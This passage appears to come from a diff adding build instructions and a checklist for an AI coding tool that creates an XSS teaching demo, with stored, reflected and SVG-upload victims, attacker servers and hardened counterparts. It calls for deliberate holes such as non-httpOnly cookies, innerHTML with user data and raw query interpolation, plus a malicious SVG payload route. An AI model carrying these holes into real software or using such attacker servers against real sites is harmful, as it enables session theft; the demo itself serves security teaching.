+- No TypeScript — plain JS (CommonJS require syntax for Node)
+- No build step — must run with `node server.js` directly
+- No external CSS frameworks — inline `<style>` blocks only
+- No placeholder lorem ipsum — all copy must be realistic product language
+- Product names, prices, and bios must be realistic
+- The malicious SVG served from `/payload.svg` must be a complete, valid SVG document
+- `victim.html` for SVG demo must demonstrably use safe DOM methods (textContent,
+  createElement, setAttribute) for all user-provided data — ZERO innerHTML with user data
+
+---
+
+# PART 6: Final Checklist for Cursor
+
+Before finishing, verify:
+
+- [ ] `stored/victim-server.js` — cookie uses `httpOnly: false`
+- [ ] `stored/victim.html` — `meta.innerHTML` line converted to safe DOM methods, `message.innerHTML` kept (primary demo)
+- [ ] `stored/admin.html` — message uses `innerHTML` (vulnerability), meta uses safe DOM methods
+- [ ] `stored/victim-server-protected.js` — created on port 3009 with all 3 fixes
+- [ ] `stored/victim-protected.html` — created with green banner, textContent for message
+- [ ] `stored/package.json` — has `"victim-protected"` script
+- [ ] `reflected/victim-server.js` — port 3003, raw `req.query.q` interpolated in TWO places
+- [ ] `reflected/victim-server-protected.js` — port 3008 (NOT 3005), htmlEncode applied
+- [ ] `reflected/package.json` — has `"victim-protected"` script
+- [ ] `reflected/attacker.html` — victim switcher dynamically updates attack URL (client-side only)
+- [ ] `svg-upload/victim-server.js` — port 3005, multer accepts all file types, no Content-Disposition
+- [ ] `svg-upload/attacker-server.js` — port 3006, `/payload.svg` route returns valid malicious SVG
+- [ ] `svg-upload/victim-server-protected.js` — port 3007, all 4 layers applied, Sharp re-encoding
+- [ ] `svg-upload/package.json` — has `sharp` in dependencies, has `"victim-protected"` script
+- [ ] `svg-upload/victim.html` — ZERO innerHTML with user data, all safe DOM methods
+- [ ] `demo-attacked/xss/README.md` — created with all sections
